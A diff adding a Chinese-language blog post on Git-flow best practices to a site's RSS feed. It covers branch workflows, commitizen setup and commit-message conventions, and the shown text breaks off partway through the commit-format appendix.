@@ -8,6 +8,591 @@
         <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />  
           
             <item>  
+               <title>Git-flow最佳实践方法</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#1-原则&quot; id=&quot;markdown-toc-1-原则&quot;&gt;1. 原则&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#2-操作步骤&quot; id=&quot;markdown-toc-2-操作步骤&quot;&gt;2. 操作步骤&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#21-初始阶段&quot; id=&quot;markdown-toc-21-初始阶段&quot;&gt;2.1 初始阶段&lt;/a&gt;        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#211-主要的步骤&quot; id=&quot;markdown-toc-211-主要的步骤&quot;&gt;2.1.1 主要的步骤&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#22-开发阶段&quot; id=&quot;markdown-toc-22-开发阶段&quot;&gt;2.2 开发阶段&lt;/a&gt;        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#221-新功能开发&quot; id=&quot;markdown-toc-221-新功能开发&quot;&gt;2.2.1 新功能开发&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#222-本地编码提交&quot; id=&quot;markdown-toc-222-本地编码提交&quot;&gt;2.2.2 本地编码提交&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#223-合并开发分支&quot; id=&quot;markdown-toc-223-合并开发分支&quot;&gt;2.2.3 合并开发分支&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#224-发布release分支&quot; id=&quot;markdown-toc-224-发布release分支&quot;&gt;2.2.4 发布release分支&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#225-合并到主分支上&quot; id=&quot;markdown-toc-225-合并到主分支上&quot;&gt;2.2.5 合并到主分支上&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#226-打标签正式发布&quot; id=&quot;markdown-toc-226-打标签正式发布&quot;&gt;2.2.6 打标签正式发布&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#23-上线阶段&quot; id=&quot;markdown-toc-23-上线阶段&quot;&gt;2.3 上线阶段&lt;/a&gt;        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#231-创建hotfix分支&quot; id=&quot;markdown-toc-231-创建hotfix分支&quot;&gt;2.3.1 创建hotfix分支&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#232-合并到主分支中&quot; id=&quot;markdown-toc-232-合并到主分支中&quot;&gt;2.3.2 合并到主分支中&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#233-主分支打标签发布&quot; id=&quot;markdown-toc-233-主分支打标签发布&quot;&gt;2.3.3 主分支打标签发布&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#附录a-分支命名规范&quot; id=&quot;markdown-toc-附录a-分支命名规范&quot;&gt;附录A 分支命名规范&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#格式规定&quot; id=&quot;markdown-toc-格式规定&quot;&gt;格式规定&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#格式含义&quot; id=&quot;markdown-toc-格式含义&quot;&gt;格式含义&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#附录b-提交描述规范&quot; id=&quot;markdown-toc-附录b-提交描述规范&quot;&gt;附录B 提交描述规范&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#header&quot; id=&quot;markdown-toc-header&quot;&gt;Header&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#body&quot; id=&quot;markdown-toc-body&quot;&gt;Body&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#footer&quot; id=&quot;markdown-toc-footer&quot;&gt;Footer&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#附录c-标签命名规范&quot; id=&quot;markdown-toc-附录c-标签命名规范&quot;&gt;附录C 标签命名规范&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#tag命名规范&quot; id=&quot;markdown-toc-tag命名规范&quot;&gt;Tag命名规范&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#希腊字母版本号&quot; id=&quot;markdown-toc-希腊字母版本号&quot;&gt;希腊字母版本号&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#附录d-git-flow工具&quot; id=&quot;markdown-toc-附录d-git-flow工具&quot;&gt;附录D Git-flow工具&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#安装方式&quot; id=&quot;markdown-toc-安装方式&quot;&gt;安装方式&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#使用步骤&quot; id=&quot;markdown-toc-使用步骤&quot;&gt;使用步骤&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;1-原则&quot;&gt;1. 原则&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;master&lt;/strong&gt; 为保护分支，存储正式版本的发布历史，是最稳定的版本，禁止在此分支中进行代码修改和版本提交，所有的提交应该都是基于tag的。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;develop&lt;/strong&gt; 为功能集成分支，所有的功能开发都应该从此分支中checkout，某些时候develop分支的内容应大于master主分支。&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;2-操作步骤&quot;&gt;2. 操作步骤&lt;/h2&gt;
+
+&lt;h3 id=&quot;21-初始阶段&quot;&gt;2.1 初始阶段&lt;/h3&gt;
+
+&lt;p&gt;项目刚开始时，核心开发人员在本地搭建好基础架构，保证基本运行。此时应初始化git仓库，并进行远程仓库的关联，master分支自动创建，后基于master分支创建好develop分支。&lt;/p&gt;
+
+&lt;h4 id=&quot;211-主要的步骤&quot;&gt;2.1.1 主要的步骤&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;在远程仓库创建好相关的issue类型&lt;/li&gt;
+  &lt;li&gt;使用额外的工具强制进行规范化约束&lt;/li&gt;
+  &lt;li&gt;创建好基本的两个分支master和develop&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;为提交信息做规范化约束，进入工程根目录执行以下命令&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;npm init
+
+&lt;span class=&quot;c&quot;&gt;# 所有的&quot;git commit&quot;全部使用&quot;git cz&quot;的方式进行提交&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;npm &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; commitizen
+&lt;span class=&quot;c&quot;&gt;# 使此工程的提交格式以angular的范式进行约束&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;commitizen init cz-conventional-changelog &lt;span class=&quot;nt&quot;&gt;--save&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--save-exact&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 安装生成CHANGELOG的cli工具，开发人员可以选择不安装，配置管理人员需要进行安装&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;npm &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; conventional-changelog-cli
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;本地工程结构创建，初始化本地git并关联远程仓库&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;# HelloWorld&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; README.md
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git init
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git add &lt;span class=&quot;nt&quot;&gt;-all&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git commit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;初始版本提交&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git remote add origin git@github.com:wangjunneil/HelloWorld.git
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git push &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; origin master
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;执行完上述命令后，默认会在远程仓库中创建主干 &lt;em&gt;master&lt;/em&gt; 分支。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;基于主干分支创建开发分支develop&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch develop
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git push &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; origin develop
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch &lt;span class=&quot;c&quot;&gt;# 查看本地分支&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# 查看本地和远程分支&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# 查看远程分支&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;em&gt;develop&lt;/em&gt; 分支包含了项目的全部历史，此时远程仓库应该有 &lt;em&gt;master&lt;/em&gt; 和 &lt;em&gt;develop&lt;/em&gt; 两个最主要的分支。&lt;/p&gt;
+
+&lt;h3 id=&quot;22-开发阶段&quot;&gt;2.2 开发阶段&lt;/h3&gt;
+
+&lt;p&gt;开发人员从git中clone出项目源码，创建好develop分支的跟踪分支，准备进行功能开发。&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone git@github.com:wangjunneil/HelloWorld.git
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; develop origin/develop
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;221-新功能开发&quot;&gt;2.2.1 新功能开发&lt;/h4&gt;
+
+&lt;p&gt;所有新功能的开发都需要在develop分支中checkout一个功能分支feature，功能的分支的命名规范见 &lt;strong&gt;附录A 分支命名规范&lt;/strong&gt;。&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; feature_20170811_personal develop
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;222-本地编码提交&quot;&gt;2.2.2 本地编码提交&lt;/h4&gt;
+
+&lt;p&gt;开发人员每次提交都应该保证功能单元的完成，功能的开发一直处于本地git环境中，不push远程仓库。特殊情况是此功能分支由两人开发或者处于交接状态，应该将功能分支push到远程仓库中。&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git status
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git add XXX-FILES
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git cz &lt;span class=&quot;c&quot;&gt;# 安装了commitizen&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 可选，查看提交记录&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git log &lt;span class=&quot;nt&quot;&gt;--pretty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;format:&lt;span class=&quot;s2&quot;&gt;&quot;%ad || %h || %s || Author:%an &quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;short | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git log v1.0.0..v2.0.1 &lt;span class=&quot;nt&quot;&gt;--pretty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;format:&lt;span class=&quot;s2&quot;&gt;&quot;%ad || %h || %s || Author:%an &quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;short | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 可选，将功能分支发布到版本库中&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git push &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; origin feature_20170811_personal
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;虽然使用了”commitizen”工具进行了约束，但还是建议参看 &lt;strong&gt;附录B 提交描述格式&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;223-合并开发分支&quot;&gt;2.2.3 合并开发分支&lt;/h4&gt;
+
+&lt;p&gt;当开发人员在本地git中完成了功能的开发并已经自己测试过，此时需要合并到总的开发分支上&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git pull origin develop &lt;span class=&quot;c&quot;&gt;# 首先保证本地develop分支为最新版本&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout develop &lt;span class=&quot;c&quot;&gt;# 切换到develop分支上&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git merge &lt;span class=&quot;nt&quot;&gt;--no-ff&lt;/span&gt; feature_20170811_personal &lt;span class=&quot;c&quot;&gt;# 合并功能分支&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git push origin develop &lt;span class=&quot;c&quot;&gt;# 提交develop分支的远程版本&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 可选，删除远程分支&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git push origin &lt;span class=&quot;nt&quot;&gt;--delete&lt;/span&gt; feature_20170811_personal
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;开发人员完成了功能开发后，继续循环从 &lt;strong&gt;2.2.1 新功能开发&lt;/strong&gt; 开始做新功能。&lt;/p&gt;
+
+&lt;h4 id=&quot;224-发布release分支&quot;&gt;2.2.4 发布release分支&lt;/h4&gt;
+
+&lt;p&gt;当develop分支汇集了足够的新功能和bug修复代码之后，项目组决定可以发布release版本进行测试了（所以release也叫做测试分支），此时从develop分支上发布release分支，用于持续集成和服务器上测试，测试包括集成测试和手动用户接受测试。对于测试中发现的问题，直接在release上修改，完成后再次部署测试。这个分支应该只做bug修复、文档生成和其他面向发布任务。&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; release-0.1.0 develop
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;225-合并到主分支上&quot;&gt;2.2.5 合并到主分支上&lt;/h4&gt;
+
+&lt;p&gt;当release代码通过测试后，开始进行分支合并，&lt;strong&gt;合并前需要做好代码评审，而非事后&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout master
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git merge &lt;span class=&quot;nt&quot;&gt;--no-ff&lt;/span&gt; release-0.1.0
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git push origin master
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout develop
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git merge &lt;span class=&quot;nt&quot;&gt;--no-ff&lt;/span&gt; release-0.1.0
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git push origin develop
+
+&lt;span class=&quot;c&quot;&gt;# 可选&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; release-0.1.0
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git push origin &lt;span class=&quot;nt&quot;&gt;--delete&lt;/span&gt; release-0.1.0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;226-打标签正式发布&quot;&gt;2.2.6 打标签正式发布&lt;/h4&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git tag &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; v0.1.0 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;initial public release&quot;&lt;/span&gt; master
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git push origin v0.1.0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;打完标签后，远程仓库中已经包含此标签的基本信息，但作为发布版本，需要清楚的描述出此版本修复了哪些问题以及增加了哪些新的功能。&lt;/p&gt;
+
+&lt;p&gt;此时需要生成此版本的CHANGELOG信息，将信息编辑进release note中。要生成规范的CHANGELOG信息，需要 &lt;strong&gt;按照标准的提交格式进行提交&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 生成CHANGELOG明细并进行修改&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;conventional-changelog &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; angular &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; CHANGELOG.md &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;生成的CHANGELOG信息，作为”release note”后的效果如下图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/Screen%20Shot%202018-03-29%20at%201.13.27%20AM.png&quot; alt=&quot;release-note&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;关于标签命名规范请参看 &lt;strong&gt;附录C 标签命名规范&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;23-上线阶段&quot;&gt;2.3 上线阶段&lt;/h3&gt;
+
+&lt;p&gt;在线上运行的master标签版本，难免会出现bug，接受客户的ticket进行修复，直接在master分支上checkout出hotfix的维护分支，维护分支或说是热修复分支用于生成快速给产品发布版本打补丁，这是唯一从master中fork出来的分支。&lt;/p&gt;
+
+&lt;h4 id=&quot;231-创建hotfix分支&quot;&gt;2.3.1 创建hotfix分支&lt;/h4&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; hotfix-0.1.1 master
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;232-合并到主分支中&quot;&gt;2.3.2 合并到主分支中&lt;/h4&gt;
+
+&lt;p&gt;完成hotfix的bug修复后，合并到master分支及develop分支（master分支存在此问题，则develop分支肯定也有）&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout master
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git merge &lt;span class=&quot;nt&quot;&gt;--no-ff&lt;/span&gt; hotfix-0.1.1
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git push origin master
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout develop
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git merge &lt;span class=&quot;nt&quot;&gt;--no-ff&lt;/span&gt; hotfix-0.1.1
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git push origin develop
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; hotfix-0.1.1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;233-主分支打标签发布&quot;&gt;2.3.3 主分支打标签发布&lt;/h4&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git tag &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; v0.1.1 master
+git push &lt;span class=&quot;nt&quot;&gt;--tags&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;附录a-分支命名规范&quot;&gt;附录A 分支命名规范&lt;/h2&gt;
+
+&lt;h3 id=&quot;格式规定&quot;&gt;格式规定&lt;/h3&gt;
+
+&lt;p&gt;分支类型_创建时间_分支功能，例如：feature_20180311_personal&lt;/p&gt;
+
+&lt;h3 id=&quot;格式含义&quot;&gt;格式含义&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;分支类型&lt;/th&gt;
+      &lt;th&gt;创建时间&lt;/th&gt;
+      &lt;th&gt;分支功能&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;新的功能（feature）&lt;br /&gt;问题修复（hotfix）&lt;br /&gt;功能重构（refactor）&lt;/td&gt;
+      &lt;td&gt;年月日，8位有效数字&lt;/td&gt;
+      &lt;td&gt;简要描述此分支的作用，不超过10字&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;附录b-提交描述规范&quot;&gt;附录B 提交描述规范&lt;/h2&gt;
+
+&lt;p&gt;提交禁止使用&lt;code class=&quot;highlighter-rouge&quot;&gt;git commit -m &quot;xxx&quot;&lt;/code&gt;的方式，因为这种方式不能准确描述出本地提交的目的、结果。&lt;/p&gt;
+
+&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;git commit&lt;/code&gt;方式可以以文本的方式来描述本次提交的具体信息，这对于后续追溯和问题的发现有很大的帮助。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;commit message格式&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;提交信息包含三个部分，Header、Body和Footer，如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;type&amp;gt;(&amp;lt;scope&amp;gt;): &amp;lt;subject&amp;gt;
+
+&amp;lt;body&amp;gt;
+
+&amp;lt;footer&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;其中Header是必须的，在变更范围不是很大的情况下，Body和Footer可以省略。&lt;/p&gt;
+
+&lt;h3 id=&quot;header&quot;&gt;Header&lt;/h3&gt;
+
+&lt;p&gt;Header部分只有一行，包括三个字段：type（必需）、scope（可选）和subject（必需）。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;(1) type&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;type用于说明 commit 的类别，允许使用下面7个标识。&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;feat&lt;/td&gt;
+      &lt;td&gt;新功能（feature）&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;fix&lt;/td&gt;
+      &lt;td&gt;修补的问题（bug）&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;docs&lt;/td&gt;
+      &lt;td&gt;文档变更（documentation）&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;style&lt;/td&gt;
+      &lt;td&gt;格式变更（不影响代码运行的变动）&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;refactor&lt;/td&gt;
+      &lt;td&gt;重构（既不是新增功能，也不是修改bug）&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;test&lt;/td&gt;
+      &lt;td&gt;增加测试&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;chore&lt;/td&gt;
+      &lt;td&gt;构建过程或辅助工具的变更&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;若type为feat和fix，则该 commit 将肯定出现在 Change log 之中。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;(2) scope&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;scope用于说明 commit 影响的范围，比如数据层、控制层、视图层等等，视项目不同而不同。&lt;u&gt;建议项目初期定义好相关枚举&lt;/u&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;(3) subject&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;subject是 commit 目的的简短描述，不超过50个字符。&lt;/p&gt;
+
